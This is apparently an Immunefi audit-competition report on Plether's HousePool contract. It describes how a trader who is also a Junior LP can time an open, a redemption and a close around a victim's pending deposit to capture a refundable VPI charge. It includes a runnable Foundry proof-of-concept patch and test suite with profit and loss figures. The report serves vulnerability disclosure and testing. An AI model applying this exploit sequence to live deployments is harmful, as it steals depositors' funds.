# \#97784 [SC-Critical] Attacker extracts refundable VPI from a pending Junior LP depositor through epoch-timed redemption

**Submitted on Nov 3rd 2026 at 06:29:02 UTC by @cashybear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97784
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief/Intro

A trader who owns matured Junior LP shares can target another user’s pending deposit. The trader pays positive virtual price impact (VPI) into the pool, redeems their LP shares while that payment raises the share price, then closes the position after the victim’s deposit activates and receives the VPI back from pool cash. In the frozen-commit PoC, the attacker realizes a profit while the independent depositor loses USDG.

### Vulnerability Details

Positive VPI on a skew-increasing open is transferred into HousePool as part of tradeCostAssets. LP equity and the Junior vault share price then reflect that physical cash. The LP NAV calculation accounts for trader claims and terminal price PnL, but does not reserve the already-collected positive VPI that the same trader may receive back on close. A skew-reducing close can pay that rebate from free pool cash and credit it to the trader.

An attacker can exploit the change in LP ownership between those two actions:

1. The independent victim requests a 1,000,000 USDG Junior deposit. The request and pending amount are public before the attacker acts.
2. The attacker, already holding matured Junior shares, opens a 750,000-token LONG shortly before the epoch’s LP request cutoff. The open pays 1,406.227556 USDG of positive VPI into the pool.
3. The attacker requests redemption of their own shares. Settlement funds that redemption and activates the victim’s pending deposit in the same epoch. The attacker’s redemption price includes the collected VPI.
4. The attacker closes the position after activation. The close rebates the VPI from pool cash, now partly owned by the new depositor. The victim needs to take no action during the attack.

The primary PoC holds the mark at 1.00 and restores pool assets before close to within one 6-decimal USDG atom of their post-open amount. This distinguishes the issue from the published finding that increases a VPI rebate by reducing pool depth. The whitepaper explains that a VPI charge and reversal telescope at fixed depth; here, the charge is effectively returned to the trader after an LP ownership change.

The protocol documents that anticipated VPI is excluded from terminal price NAV and that pending LP requests can reprice at settlement. The claimed vulnerability is the resulting realized transfer of an already-collected, refundable charge: the exiting attacker receives its share-price uplift while the incoming depositor bears the later refund. This distinction and the documented design choice should be considered during triage.

The attached Foundry PoC runs at frozen commit a82d4fefb02768e5b3bddcc97dee371eee24fea8, uses the released six-feed configuration and production Router core, and modifies no in-scope source contract. Only USDG and Pyth updates are mocked, as permitted by the scope. An unrelated unprivileged address performs keeper actions. The focused suite passes 3/3 tests; a separate historical six-feed price-path test passes 1/1.

### Impact Details

The selected in-scope impact is Critical: direct theft of user funds, whether at rest or in motion, other than unclaimed yield. In the primary PoC, all final amounts are realized USDG withdrawals, including the attacker’s full remaining trader cash:

| Account | Initial assets | Final realized assets | Change |
|---|---:|---:|---:|
| Attacker: Junior LP shares and trader collateral | 1,100,000.000000 USDG | 1,100,093.015682 USDG | +93.015682 USDG |
| Independent pending Junior depositor | 1,000,000.000000 USDG | 999,450.627881 USDG | −549.372119 USDG |

Without the attacker trade and exit, the same-timing deposit-and-redemption control returns 999,999.999993 USDG to the victim. A second control keeps the trade and victim deposit but makes a different incumbent LP exit: the victim still loses 549.372118 USDG, while the attacker, who retains their LP shares through the rebate, loses 456.356435 USDG. The attacker’s own redemption is what turns the cross-cohort loss into attacker profit.

A separate local test uses decoded six-feed values and times from mined Plether testnet updates, including a 0.1847 bps price move adverse to the attacker’s LONG. It produces attacker profit of 79.576480 USDG and victim loss of 535.435894 USDG. Those values are replayed through MockPyth; the test does not verify the original Pyth signatures. The balance figures exclude gas and oracle data fees and do not imply profit under every future market path.

### References

- Plether competition scope and PoC requirements
- Open settlement transfers positive trade cost to HousePool
- HousePool LP equity calculation
- Close VPI lifetime clamp
- Close settlement pays the rebate to the trader
- Public pending deposit state
- Whitepaper VPI model
- Documented terminal NAV treatment

## Proof of Concept

## Steps to reproduce

1. Check out Plether commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. Create `BasePerpTestSixFeed.patch` and `VpiLpRotationSubmission.t.sol` from the code blocks below. The patch changes only a test fixture; no contract under `packages/perps/src` is modified.

2. From the repository root, run:
   git apply BasePerpTestSixFeed.patch
   cp VpiLpRotationSubmission.t.sol packages/perps/test/perps/accounting/fees/VpiLpRotationSubmission.t.sol
   forge test --root packages/perps --match-path 'test/perps/accounting/fees/VpiLpRotationSubmission.t.sol' -vv

3. The test gives the attacker and an independent incumbent 1,000,000 USDG each in matured Junior LP shares. The attacker also has 100,000 USDG of trader collateral. It uses the released six-feed configuration and the production Router core; only USDG and Pyth updates are mocked.

4. Ten minutes before the epoch boundary, an independent victim requests a 1,000,000 USDG Junior deposit. This request occurs before the attacker acts and is visible in the public pending-deposit state.

5. Six minutes before the boundary, the attacker opens a 750,000-token LONG. The open charges 1,406.227556 USDG of positive VPI into HousePool, increasing the Junior share price.

6. Before the LP request cutoff, the attacker requests redemption of their own Junior shares. An unrelated unprivileged address performs keeper actions. Epoch settlement funds the attacker’s redemption and activates the victim’s deposit.

7. After the victim becomes an LP, the attacker closes the LONG at the same 1.00 mark. The position receives a VPI rebate from pool cash. Pool assets immediately after the open and immediately before the close differ by only one 6-decimal USDG atom.

8. The victim redeems all their Junior shares. The attacker redeems their remaining shares and withdraws all remaining trader cash. The attacker finishes with 1,100,093.015682 USDG versus 1,100,000.000000 initially; the independent victim receives 999,450.627881 USDG versus their 1,000,000.000000 deposit.

9. The test suite also runs two controls. Without the attacker trade and exit, the victim receives 999,999.999993 USDG. With the same trade but a different incumbent exiting, the victim still loses 549.372118 USDG, while the attacker loses 456.356435 USDG. The attacker’s own LP exit is what converts the victim’s loss into attacker profit.

Expected result: 3 tests pass, 0 fail.
# Runnable Foundry PoC for frozen commit a82d4fefb02768e5b3bddcc97dee371eee24fea8

Create `BasePerpTestSixFeed.patch` and `VpiLpRotationSubmission.t.sol` from the two code blocks below. From the frozen repository root, run:

```sh
git apply BasePerpTestSixFeed.patch
cp VpiLpRotationSubmission.t.sol packages/perps/test/perps/accounting/fees/VpiLpRotationSubmission.t.sol
forge test --root packages/perps --match-path 'test/perps/accounting/fees/VpiLpRotationSubmission.t.sol' -vv
```

The patch changes only the test fixture. No in-scope `packages/perps/src` file is modified. The primary attack, no-attack control, and same-trade incumbent-exit control pass 3/3 tests. The attacker final USDG wallet balance is 1,100,093.015682 versus 1,100,000.000000 initially; the independent victim redeems 999,450.627881 versus 1,000,000.000000 deposited.

## BasePerpTestSixFeed.patch

```diff
diff --git a/packages/perps/test/perps/BasePerpTest.sol b/packages/perps/test/perps/BasePerpTest.sol
index f322d21..249d303 100644
--- a/packages/perps/test/perps/BasePerpTest.sol
+++ b/packages/perps/test/perps/BasePerpTest.sol
@@ -136,7 +136,7 @@ abstract contract BasePerpTest is RecordedOrderReceipts {
         baseMockPyth = new MockPyth();
         baseMockPyth.setSynchronizeLegacyUniquePrices(true);
         bytes32[] memory baseFeedIds = _basePythFeedIds();
-        baseMockPyth.setAllPrices(baseFeedIds, int64(100_000_000), int32(-8), SETUP_TIMESTAMP);
+        _initializeBasePythPrices(baseFeedIds);
 
         seniorVault = new TrancheVault(
             IERC20(address(settlementToken)), address(pool), true, "Plether Senior LP", "seniorAssets", 0, address(0)
@@ -272,25 +272,29 @@ abstract contract BasePerpTest is RecordedOrderReceipts {
         return address(this);
     }
 
-    function _basePythFeedIds() internal pure returns (bytes32[] memory feedIds) {
+    function _initializeBasePythPrices(bytes32[] memory feedIds) internal virtual {
+        baseMockPyth.setAllPrices(feedIds, int64(100_000_000), int32(-8), SETUP_TIMESTAMP);
+    }
+
+    function _basePythFeedIds() internal pure virtual returns (bytes32[] memory feedIds) {
         feedIds = new bytes32[](2);
         feedIds[0] = BASE_PYTH_FEED_A;
         feedIds[1] = BASE_PYTH_FEED_B;
     }
 
-    function _basePythWeights() internal pure returns (uint256[] memory weights) {
+    function _basePythWeights() internal pure virtual returns (uint256[] memory weights) {
         weights = new uint256[](2);
         weights[0] = 0.5e18;
         weights[1] = 0.5e18;
     }
 
-    function _basePythBasePrices() internal pure returns (uint256[] memory basePrices) {
+    function _basePythBasePrices() internal pure virtual returns (uint256[] memory basePrices) {
         basePrices = new uint256[](2);
         basePrices[0] = 1e8;
         basePrices[1] = 1e8;
     }
 
-    function _basePythInversions() internal pure returns (bool[] memory inversions) {
+    function _basePythInversions() internal pure virtual returns (bool[] memory inversions) {
         inversions = new bool[](2);
     }
 
@@ -300,7 +304,7 @@ abstract contract BasePerpTest is RecordedOrderReceipts {
 
     function _mockPythUpdateData(
         uint256 price
-    ) internal returns (bytes[] memory updateData) {
+    ) internal virtual returns (bytes[] memory updateData) {
         // The optimizer treats block fields as constant within a transaction, even across cheatcodes.
         vm.roll(vm.getBlockNumber() + 1);
         vm.warp(vm.getBlockTimestamp() + 1);
```

## VpiLpRotationSubmission.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {LegacyOrderRouterHarness} from "../../../utils/LegacyOrderRouterHarness.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice Tests an LP/trader ownership rotation around a refundable positive VPI charge.
contract VpiLpRotationSubmissionTest is BasePerpTest {
    address private constant ATTACKER = address(0xA771);
    address private constant INCUMBENT_LP = address(0xB011);
    address private constant NEW_LP = address(0xB012);
    address private constant KEEPER = address(0xC0FFEE);
    uint256 private constant LP_ASSETS = 1_000_000e6;
    uint256 private constant TRADER_ASSETS = 100_000e6;
    uint256 private constant SIZE = 750_000e18;
    uint64 private constant MOCK_CONFIDENCE = 3_000; // 0.3 bps of the 1e8 basket mark.

    function _basePythFeedIds() internal pure override returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
        ids[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        ids[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        ids[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        ids[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        ids[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        ids[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
    }

    function _basePythWeights() internal pure override returns (uint256[] memory weights) {
        weights = new uint256[](6);
        weights[0] = 576e15;
        weights[1] = 136e15;
        weights[2] = 119e15;
        weights[3] = 91e15;
        weights[4] = 42e15;
        weights[5] = 36e15;
    }

    function _basePythBasePrices() internal pure override returns (uint256[] memory prices) {
        prices = new uint256[](6);
        prices[0] = 117_500_000;
        prices[1] = 638_000;
        prices[2] = 134_480_000;
        prices[3] = 72_880_000;
        prices[4] = 10_860_000;
        prices[5] = 126_100_000;
    }

    function _basePythInversions() internal pure override returns (bool[] memory inversions) {
        inversions = new bool[](6);
        inversions[1] = true;
        inversions[3] = true;
        inversions[4] = true;
        inversions[5] = true;
    }

    function _basePythRawPrices() private pure returns (uint256[] memory prices) {
        prices = _basePythBasePrices();
        bool[] memory inversions = _basePythInversions();
        for (uint256 i; i < prices.length; ++i) {
            if (inversions[i]) prices[i] = 1e16 / prices[i];
        }
    }

    function _initializeBasePythPrices(bytes32[] memory ids) internal override {
        uint256[] memory prices = _basePythRawPrices();
        for (uint256 i; i < ids.length; ++i) {
            baseMockPyth.setPrice(ids[i], int64(int256(prices[i])), uint64(0), int32(-8), SETUP_TIMESTAMP);
        }
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(config);
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500);
        assertEq(router.minOpenNotionalAssets(), 1000e6);
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    /// @dev BasePerpTest's field has a legacy type, but this fixture deploys the exact production Router bytecode.
    ///      The PoC invokes only methods exposed by that production Router.
    function _deployLegacyOrderRouter(
        address engine_,
        address engineLens_,
        address pool_,
        address oracle_
    ) internal override returns (LegacyOrderRouterHarness deployedRouter) {
        policyEvaluator = new CfdOrderPolicyEvaluator();
        orderExecutionSidecar = new OrderRouterExecutionSidecar();
        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        OrderLifecycleBook lifecycleBook = new OrderLifecycleBook(
            predictedRouter, engine_, address(clearinghouse), pool_
        );
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        OrderRouter productionRouter = new OrderRouter(
            engine_, engineLens_, pool_, oracle_, address(keeperSidecar), address(policyEvaluator),
            address(orderExecutionSidecar), address(lifecycleBook)
        );
        assertEq(address(productionRouter), predictedRouter);
        deployedRouter = LegacyOrderRouterHarness(payable(address(productionRouter)));
    }

    function test_LpExitAndReplacementAroundVpiRebate() public {
        _fundJunior(INCUMBENT_LP, LP_ASSETS);
        _fundJunior(ATTACKER, LP_ASSETS);
        _fundTrader(ATTACKER, TRADER_ASSETS);

        // A matured attacker LP targets an independent deposit already in the public queue.
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _updateMarkAsKeeper();
        vm.warp(pool.lpEpochStart(pool.currentLpEpoch() + 1) - 10 minutes);
        _updateMarkAsKeeper();
        uint256 replacementAssets = LP_ASSETS;
        settlementToken.mint(NEW_LP, replacementAssets);
        vm.startPrank(NEW_LP);
        settlementToken.approve(address(juniorVault), replacementAssets);
        uint256 depositId = juniorVault.requestDeposit(replacementAssets, NEW_LP, NEW_LP);
        vm.stopPrank();

        // Both LP request directions roll to the next epoch five minutes before settlement.
        vm.warp(pool.lpEpochStart(depositId) - 6 minutes);
        _updateMarkAsKeeper();
        uint256 depthBeforeOpen = pool.totalAssets();
        _executePublicOrder(false);
        uint256 depthAfterOpen = pool.totalAssets();
        (,,,,,, int256 accruedVpi) = engine.positions(ATTACKER);
        assertGt(accruedVpi, 0, "open must charge refundable positive VPI");

        uint256 attackerShares = juniorVault.estimateWithdrawShares(replacementAssets);
        assertGt(attackerShares, 0, "attacker shares must be redeemable");
        assertLe(attackerShares, juniorVault.maxRequestRedeem(ATTACKER));
        emit log_named_uint("accrued VPI assets", uint256(accruedVpi));
        emit log_named_uint("pool assets before open", depthBeforeOpen);
        emit log_named_uint("pool assets after open", depthAfterOpen);
        emit log_named_int("terminal LP price delta", engine.terminalNavSnapshot().terminalLpPriceDeltaAssets);
        emit log_named_uint("attacker exit quote", replacementAssets);

        vm.prank(ATTACKER);
        uint256 redeemId = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
        assertEq(redeemId, depositId, "exit and replacement must settle in one epoch");

        vm.warp(pool.lpEpochStart(redeemId));
        _settleEpochAsKeeper(true);
        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemId, ATTACKER);
        assertEq(claimableShares, attackerShares, "attacker exit must fully fund");
        vm.prank(ATTACKER);
        uint256 redeemedAssets = juniorVault.claimRedeem(redeemId, claimableShares, ATTACKER, ATTACKER);
        vm.prank(NEW_LP);
        juniorVault.claimDeposit(depositId, replacementAssets, NEW_LP, NEW_LP);

        emit log_named_uint("pool assets immediately before close", pool.totalAssets());
        assertApproxEqAbs(pool.totalAssets(), depthAfterOpen, 10_000,
            "replacement should restore the depth before close");
        assertEq(engine.lastMarkPrice(), 1e8, "no price movement in the attack");
        _executePublicOrder(true);

        uint256 replacementLpNavAfterClose = juniorVault.convertToAssets(juniorVault.balanceOf(NEW_LP));
        emit log_named_uint("replacement LP NAV after close", replacementLpNavAfterClose);
        emit log_named_uint("attacker redeemed assets", redeemedAssets);
        emit log_named_uint("open VPI assets", uint256(accruedVpi));
        assertLt(replacementLpNavAfterClose, replacementAssets,
            "replacement LP shares should lose value when the trader closes");

        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _updateMarkAsKeeper();
        uint256 replacementShares = juniorVault.maxRequestRedeem(NEW_LP);
        vm.prank(NEW_LP);
        uint256 replacementRedeemId = juniorVault.requestRedeem(
            replacementShares, NEW_LP, NEW_LP
        );
        uint256 attackerRemainingShares = juniorVault.maxRequestRedeem(ATTACKER);
        vm.prank(ATTACKER);
        uint256 attackerRemainderRedeemId = juniorVault.requestRedeem(
            attackerRemainingShares, ATTACKER, ATTACKER
        );
        assertEq(attackerRemainderRedeemId, replacementRedeemId);
        vm.warp(pool.lpEpochStart(replacementRedeemId));
        _settleEpochAsKeeper(false);
        uint256 replacementClaimableShares = juniorVault.claimableRedeemRequest(
            replacementRedeemId, NEW_LP
        );
        assertEq(replacementClaimableShares, replacementShares,
            "replacement LP withdrawal should be fully funded");
        vm.prank(NEW_LP);
        uint256 replacementRedeemedAssets = juniorVault.claimRedeem(
            replacementRedeemId, replacementClaimableShares, NEW_LP, NEW_LP
        );
        uint256 attackerRemainderClaimableShares = juniorVault.claimableRedeemRequest(
            attackerRemainderRedeemId, ATTACKER
        );
        assertEq(attackerRemainderClaimableShares, attackerRemainingShares);
        vm.prank(ATTACKER);
        uint256 attackerRemainderAssets = juniorVault.claimRedeem(
            attackerRemainderRedeemId, attackerRemainderClaimableShares, ATTACKER, ATTACKER
        );
        uint256 traderCash = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, traderCash);
        uint256 attackerFinalAssets = settlementToken.balanceOf(ATTACKER);
        assertEq(attackerFinalAssets, redeemedAssets + attackerRemainderAssets + traderCash);
        assertEq(clearinghouse.balanceAssets(ATTACKER), 0);
        emit log_named_uint("attacker final assets", attackerFinalAssets);
        emit log_named_uint("attacker initial assets", LP_ASSETS + TRADER_ASSETS);
        emit log_named_uint("replacement LP realized withdrawal", replacementRedeemedAssets);
        assertGt(attackerFinalAssets, LP_ASSETS + TRADER_ASSETS,
            "attacker should profit after open and close fees and carry");
        assertLt(replacementRedeemedAssets, replacementAssets,
            "the replacement LP should realize the loss on withdrawal");
    }

    function test_ControlPendingDepositorWithoutRotationWithdrawsNearPar() public {
        _fundJunior(INCUMBENT_LP, LP_ASSETS);
        _fundJunior(ATTACKER, LP_ASSETS);

        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _updateMarkAsKeeper();
        vm.warp(pool.lpEpochStart(pool.currentLpEpoch() + 1) - 10 minutes);
        _updateMarkAsKeeper();

        settlementToken.mint(NEW_LP, LP_ASSETS);
        vm.startPrank(NEW_LP);
        settlementToken.approve(address(juniorVault), LP_ASSETS);
        uint256 depositId = juniorVault.requestDeposit(LP_ASSETS, NEW_LP, NEW_LP);
        vm.stopPrank();
        vm.warp(pool.lpEpochStart(depositId));
        _settleEpochAsKeeper(false);
        vm.prank(NEW_LP);
        juniorVault.claimDeposit(depositId, LP_ASSETS, NEW_LP, NEW_LP);

        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _updateMarkAsKeeper();
        uint256 shares = juniorVault.maxRequestRedeem(NEW_LP);
        vm.prank(NEW_LP);
        uint256 redeemId = juniorVault.requestRedeem(shares, NEW_LP, NEW_LP);
        vm.warp(pool.lpEpochStart(redeemId));
        _settleEpochAsKeeper(false);
        uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, NEW_LP);
        assertEq(claimable, shares);
        vm.prank(NEW_LP);
        uint256 withdrawn = juniorVault.claimRedeem(redeemId, claimable, NEW_LP, NEW_LP);
        emit log_named_uint("control LP withdrawal", withdrawn);
        assertApproxEqAbs(withdrawn, LP_ASSETS, 1e6,
            "without the attacker rotation the depositor should recover their principal");
    }

    function test_ControlSameTradeWithoutAttackerLpExitLosesMoney() public {
        _fundJunior(INCUMBENT_LP, LP_ASSETS);
        _fundJunior(ATTACKER, LP_ASSETS);
        _fundTrader(ATTACKER, TRADER_ASSETS);

        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _updateMarkAsKeeper();
        vm.warp(pool.lpEpochStart(pool.currentLpEpoch() + 1) - 10 minutes);
        _updateMarkAsKeeper();
        settlementToken.mint(NEW_LP, LP_ASSETS);
        vm.startPrank(NEW_LP);
        settlementToken.approve(address(juniorVault), LP_ASSETS);
        uint256 depositId = juniorVault.requestDeposit(LP_ASSETS, NEW_LP, NEW_LP);
        vm.stopPrank();

        vm.warp(pool.lpEpochStart(depositId) - 6 minutes);
        _updateMarkAsKeeper();
        _executePublicOrder(false);
        uint256 depthAfterOpen = pool.totalAssets();
        uint256 incumbentShares = juniorVault.estimateWithdrawShares(LP_ASSETS);
        vm.prank(INCUMBENT_LP);
        uint256 incumbentRedeemId = juniorVault.requestRedeem(
            incumbentShares, INCUMBENT_LP, INCUMBENT_LP
        );
        assertEq(incumbentRedeemId, depositId);
        vm.warp(pool.lpEpochStart(depositId));
        _settleEpochAsKeeper(true);
        uint256 incumbentClaimable = juniorVault.claimableRedeemRequest(
            incumbentRedeemId, INCUMBENT_LP
        );
        assertEq(incumbentClaimable, incumbentShares);
        vm.prank(INCUMBENT_LP);
        juniorVault.claimRedeem(
            incumbentRedeemId, incumbentClaimable, INCUMBENT_LP, INCUMBENT_LP
        );
        vm.prank(NEW_LP);
        juniorVault.claimDeposit(depositId, LP_ASSETS, NEW_LP, NEW_LP);
        assertApproxEqAbs(pool.totalAssets(), depthAfterOpen, 10_000,
            "incumbent exit should restore the same close depth");
        _executePublicOrder(true);

        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _updateMarkAsKeeper();
        uint256 shares = juniorVault.maxRequestRedeem(ATTACKER);
        vm.prank(ATTACKER);
        uint256 redeemId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        uint256 victimShares = juniorVault.maxRequestRedeem(NEW_LP);
        vm.prank(NEW_LP);
        uint256 victimRedeemId = juniorVault.requestRedeem(victimShares, NEW_LP, NEW_LP);
        assertEq(victimRedeemId, redeemId);
        vm.warp(pool.lpEpochStart(redeemId));
        _settleEpochAsKeeper(false);
        uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, ATTACKER);
        assertEq(claimable, shares);
        vm.prank(ATTACKER);
        uint256 redeemed = juniorVault.claimRedeem(redeemId, claimable, ATTACKER, ATTACKER);
        uint256 victimClaimable = juniorVault.claimableRedeemRequest(victimRedeemId, NEW_LP);
        assertEq(victimClaimable, victimShares);
        vm.prank(NEW_LP);
        uint256 victimRedeemedAssets = juniorVault.claimRedeem(
            victimRedeemId, victimClaimable, NEW_LP, NEW_LP
        );
        emit log_named_uint("control same-trade victim realized withdrawal", victimRedeemedAssets);
        assertLt(victimRedeemedAssets, LP_ASSETS, "victim should still absorb the later rebate");
        uint256 traderCash = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, traderCash);
        uint256 attackerFinalAssets = settlementToken.balanceOf(ATTACKER);
        assertEq(attackerFinalAssets, redeemed + traderCash);
        assertEq(clearinghouse.balanceAssets(ATTACKER), 0);
        emit log_named_uint("no-LP-exit attacker final assets", attackerFinalAssets);
        assertLt(attackerFinalAssets, LP_ASSETS + TRADER_ASSETS,
            "keeping LP shares through the rebate should not extract cash");
    }

    function _executePublicOrder(bool isClose) private {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = bytes32(uint256(router.nextCommitId()));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = SIZE;
        request.marginDelta = isClose ? 0 : 30_000e6;
        request.targetPrice = isClose ? type(uint256).max : 1;
        request.isClose = isClose;
        request.bounds.submitBy = uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds());
        request.bounds.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        request.bounds.allowedExecutionModes = 7;
        request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        request.bounds.maxExecutionBountyAssets = type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = type(uint32).max;

        vm.prank(ATTACKER);
        uint64 id = router.commitOrder(request);
        bytes[] memory update = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

    function _updateMarkAsKeeper() private {
        bytes[] memory update = _freshMockPythUpdateData();
        vm.prank(KEEPER);
        router.updateMarkPrice(update);
    }

    function _settleEpochAsKeeper(bool historical) private {
        bytes[] memory update = historical ? _mockPythUpdateData(1e8) : _freshMockPythUpdateData();
        vm.prank(KEEPER);
        router.settleLpEpoch(update);
    }

    function _mockPythUpdateData(uint256 price) internal override returns (bytes[] memory updateData) {
        assertEq(price, 1e8);
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        updateData = _sixFeedUpdate(_mockHistoricalPublishTime());
    }

    function _freshMockPythUpdateData() private returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        updateData = _sixFeedUpdate(vm.getBlockTimestamp());
    }

    function _sixFeedUpdate(uint256 publishTime) private pure returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        uint256[] memory bases = _basePythRawPrices();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            uint64 confidence = uint64((bases[i] * MOCK_CONFIDENCE) / 1e8);
            updates[i] = MockPyth.FeedUpdate({
                id: ids[i],
                price: MockPyth.MockPrice({
                    price: int64(int256(bases[i])),
                    conf: confidence,
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: publishTime - 1
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }
}
```

